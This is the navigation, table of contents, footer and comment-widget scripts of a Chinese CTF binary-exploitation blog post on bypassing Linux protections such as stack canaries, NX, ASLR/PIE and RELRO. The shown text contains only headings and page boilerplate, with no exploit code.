class="pagination-info"><div class="label">上一篇</div><div class="prev_info">CTF-pwn 技术总结（4）</div></div></a></div><div class="next-post pull-right"><a href="/2022/01/27/CTF-pwn%20%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%882%EF%BC%89/"><img class="next-cover" src="https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/wallhaven-o3j755.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">CTF-pwn 技术总结（2）</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/01/27/CTF-pwn%20%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%882%EF%BC%89/" title="CTF-pwn 技术总结（2）"><img class="cover" src="https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/wallhaven-o3j755.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-27</div><div class="title">CTF-pwn 技术总结（2）</div></div></a></div><div><a href="/2022/01/10/CTF-pwn%20%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%881%EF%BC%89/" title="CTF-pwn 技术总结（1）"><img class="cover" src="https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/wallhaven-o37o8l.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-10</div><div class="title">CTF-pwn 技术总结（1）</div></div></a></div><div><a href="/2022/02/05/CTF-pwn-%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%884%EF%BC%89/" title="CTF-pwn 技术总结（4）"><img class="cover" src="https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/wallhaven-6o7md7.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-02-05</div><div class="title">CTF-pwn 技术总结（4）</div></div></a></div><div><a href="/2022/02/18/Tcache-pwn-%E5%85%A5%E9%97%A8/" title="Tcache pwn 入门"><img class="cover" src="https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/wallhaven-y8wr57.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-02-18</div><div class="title">Tcache pwn 入门</div></div></a></div><div><a href="/2022/02/19/PWN%E9%A2%98%E6%9C%AC%E5%9C%B0%E6%9B%B4%E6%8D%A2libc%E7%8E%AF%E5%A2%83%E6%94%BB%E7%95%A5/" title="PWN题本地更换libc环境攻略"><img class="cover" src="https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/wallhaven-wqwj5r.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-02-19</div><div class="title">PWN题本地更换libc环境攻略</div></div></a></div><div><a href="/2022/02/19/%E5%88%A9%E7%94%A8docker%E5%88%9B%E5%BB%BApwn%E7%8E%AF%E5%A2%83/" title="利用docker创建pwn环境"><img class="cover" src="https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/wallhaven-j3l825.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-02-19</div><div class="title">利用docker创建pwn环境</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/1580288142723622.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">pyh</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">32</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">21</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">17</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://sf2333.github.io/"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CTF-pwn-%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%883%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">CTF-pwn 技术总结（3）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3%E4%B8%8E%E7%BB%95%E8%BF%87"><span class="toc-number">1.1.</span> <span class="toc-text">linux安全机制详解与绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81Stack-canary"><span class="toc-number">1.1.1.</span> <span class="toc-text">一、Stack canary</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%EF%BC%9A"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">示例：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">检测</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">1.1.2.</span> <span class="toc-text">绕过方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%B3%84%E9%9C%B2canary"><span class="toc-number">1.1.3.</span> <span class="toc-text">1.泄露canary</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">例题：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="toc-number">1.1.3.1.1.</span> <span class="toc-text">思路：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXP%EF%BC%9A"><span class="toc-number">1.1.3.1.2.</span> <span class="toc-text">EXP：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%8A%AB%E6%8C%81-stack-chk-fail%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.4.</span> <span class="toc-text">2.劫持_stack_chk_fail函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A-1"><span class="toc-number">1.1.4.1.</span> <span class="toc-text">例题：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%88%86%E7%A0%B4canary"><span class="toc-number">1.1.5.</span> <span class="toc-text">3.爆破canary</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A-2"><span class="toc-number">1.1.5.1.</span> <span class="toc-text">例题：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%EF%BC%9A-1"><span class="toc-number">1.1.5.1.1.</span> <span class="toc-text">思路：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXP%EF%BC%9A-1"><span class="toc-number">1.1.5.1.2.</span> <span class="toc-text">EXP：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%A6%86%E7%9B%96TLS%E4%B8%AD%E5%82%A8%E5%AD%98%E7%9A%84canary%E5%80%BC"><span class="toc-number">1.1.6.</span> <span class="toc-text">4.覆盖TLS中储存的canary值</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A-3"><span class="toc-number">1.1.6.1.</span> <span class="toc-text">例题：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%EF%BC%9A-2"><span class="toc-number">1.1.6.1.1.</span> <span class="toc-text">思路：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXP"><span class="toc-number">1.1.6.1.2.</span> <span class="toc-text">EXP:</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-SSP-leak-%E6%94%BB%E5%87%BB"><span class="toc-number">1.1.7.</span> <span class="toc-text">5.SSP leak 攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A-4"><span class="toc-number">1.1.7.1.</span> <span class="toc-text">例题：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%EF%BC%9A-3"><span class="toc-number">1.1.7.1.1.</span> <span class="toc-text">思路：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXP%EF%BC%9A-2"><span class="toc-number">1.1.7.1.2.</span> <span class="toc-text">EXP：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81No-eXecute"><span class="toc-number">1.1.8.</span> <span class="toc-text">二、No-eXecute</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95-1"><span class="toc-number">1.1.9.</span> <span class="toc-text">绕过方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-ret2libc%E6%94%BB%E5%87%BB"><span class="toc-number">1.1.10.</span> <span class="toc-text">1.ret2libc攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%BF%AE%E6%94%B9%E5%88%86%E9%85%8D%E9%A1%B5%E9%9D%A2%E7%9A%84%E4%BF%9D%E6%8A%A4%E7%BA%A7%E5%88%AB"><span class="toc-number">1.1.11.</span> <span class="toc-text">2.修改分配页面的保护级别</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#mprotect%E4%BD%BF%E7%94%A8%EF%BC%9A"><span class="toc-number">1.1.11.1.</span> <span class="toc-text">mprotect使用：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A-5"><span class="toc-number">1.1.11.1.1.</span> <span class="toc-text">例题：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81ASLR%E5%92%8CPIE"><span class="toc-number">1.1.12.</span> <span class="toc-text">三、ASLR和PIE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ASLR"><span class="toc-number">1.1.12.1.</span> <span class="toc-text">ASLR</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PIE"><span class="toc-number">1.1.12.2.</span> <span class="toc-text">PIE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95-2"><span class="toc-number">1.1.12.3.</span> <span class="toc-text">绕过方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%B3%84%E9%9C%B2%E5%9C%B0%E5%9D%80"><span class="toc-number">1.1.13.</span> <span class="toc-text">1.泄露地址</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A-6"><span class="toc-number">1.1.13.1.</span> <span class="toc-text">例题：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-partial-write"><span class="toc-number">1.1.14.</span> <span class="toc-text">2.partial write</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A-7"><span class="toc-number">1.1.14.1.</span> <span class="toc-text">例题：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%EF%BC%9A-4"><span class="toc-number">1.1.14.1.1.</span> <span class="toc-text">思路：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXP%EF%BC%9A-3"><span class="toc-number">1.1.14.1.2.</span> <span class="toc-text">EXP：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E3%80%81RELRO"><span class="toc-number">1.1.15.</span> <span class="toc-text">四、RELRO</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Partial-RELRO%EF%BC%9A"><span class="toc-number">1.1.15.1.</span> <span class="toc-text">Partial RELRO：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Full-RELRO%EF%BC%9A"><span class="toc-number">1.1.15.2.</span> <span class="toc-text">Full RELRO：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95-3"><span class="toc-number">1.1.15.3.</span> <span class="toc-text">绕过方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%94%E3%80%81FORTIFY-SOURCE"><span class="toc-number">1.1.16.</span> <span class="toc-text">五、FORTIFY_SOURCE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%80%E5%90%AF-%E5%85%B3%E9%97%AD%E6%96%B9%E5%BC%8F"><span class="toc-number">1.1.16.1.</span> <span class="toc-text">开启&#x2F;关闭方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95-4"><span class="toc-number">1.1.16.2.</span> <span class="toc-text">绕过方法</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/02/20/anaconda%20%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/" title="Anaconda 简单使用"><img src="https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/wallhaven-wqvw2x.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Anaconda 简单使用"/></a><div class="content"><a class="title" href="/2022/02/20/anaconda%20%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/" title="Anaconda 简单使用">Anaconda 简单使用</a><time datetime="2022-02-20T08:57:12.000Z" title="发表于 2022-02-20 16:57:12">2022-02-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/02/19/%E5%88%A9%E7%94%A8docker%E5%88%9B%E5%BB%BApwn%E7%8E%AF%E5%A2%83/" title="利用docker创建pwn环境"><img src="https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/wallhaven-j3l825.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="利用docker创建pwn环境"/></a><div class="content"><a class="title" href="/2022/02/19/%E5%88%A9%E7%94%A8docker%E5%88%9B%E5%BB%BApwn%E7%8E%AF%E5%A2%83/" title="利用docker创建pwn环境">利用docker创建pwn环境</a><time datetime="2022-02-19T10:51:21.000Z" title="发表于 2022-02-19 18:51:21">2022-02-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/02/19/PWN%E9%A2%98%E6%9C%AC%E5%9C%B0%E6%9B%B4%E6%8D%A2libc%E7%8E%AF%E5%A2%83%E6%94%BB%E7%95%A5/" title="PWN题本地更换libc环境攻略"><img src="https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/wallhaven-wqwj5r.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PWN题本地更换libc环境攻略"/></a><div class="content"><a class="title" href="/2022/02/19/PWN%E9%A2%98%E6%9C%AC%E5%9C%B0%E6%9B%B4%E6%8D%A2libc%E7%8E%AF%E5%A2%83%E6%94%BB%E7%95%A5/" title="PWN题本地更换libc环境攻略">PWN题本地更换libc环境攻略</a><time datetime="2022-02-19T02:47:01.000Z" title="发表于 2022-02-19 10:47:01">2022-02-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/02/18/Tcache-pwn-%E5%85%A5%E9%97%A8/" title="Tcache pwn 入门"><img src="https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/wallhaven-y8wr57.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Tcache pwn 入门"/></a><div class="content"><a class="title" href="/2022/02/18/Tcache-pwn-%E5%85%A5%E9%97%A8/" title="Tcache pwn 入门">Tcache pwn 入门</a><time datetime="2022-02-18T11:11:21.000Z" title="发表于 2022-02-18 19:11:21">2022-02-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/02/05/CTF-pwn-%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%884%EF%BC%89/" title="CTF-pwn 技术总结（4）"><img src="https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/wallhaven-6o7md7.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CTF-pwn 技术总结（4）"/></a><div class="content"><a class="title" href="/2022/02/05/CTF-pwn-%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%884%EF%BC%89/" title="CTF-pwn 技术总结（4）">CTF-pwn 技术总结（4）</a><time datetime="2022-02-05T01:39:58.000Z" title="发表于 2022-02-05 09:39:58">2022-02-05</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By pyh</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'gs3x0tWmEaUp6ROxQivXPxe5-gzGzoHsz',
+      appKey: '8L9o8UYajHnPE9l93nFXvr60',
+      placeholder: '请在此留下你的足迹!',
+      avatar: 'monsterid',
+      meta: 'nick,mail,link'.split(','),
+      pageSize: '10',
+      lang: 'en',
+      recordIP: false,
+      serverURLs: '',
+      emojiCDN: '',
+      emojiMaps: "",
+      enableQQ: false,
+      path: window.location.pathname,
+      requiredFields: ["nick,mail"],
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  var disqus_config = function () {
+    this.page.url = 'http://example.com/2022/02/01/CTF-pwn-%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%883%EF%BC%89/'
+    this.page.identifier = '2022/02/01/CTF-pwn-技术总结（3）/'
+    this.page.title = 'CTF-pwn 技术总结（3）'
+  };
+
+  window.disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://shortname-tddqilfyge.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+}
+
+if ('Valine' === 'Disqus' || !true) {
+  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script></div><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
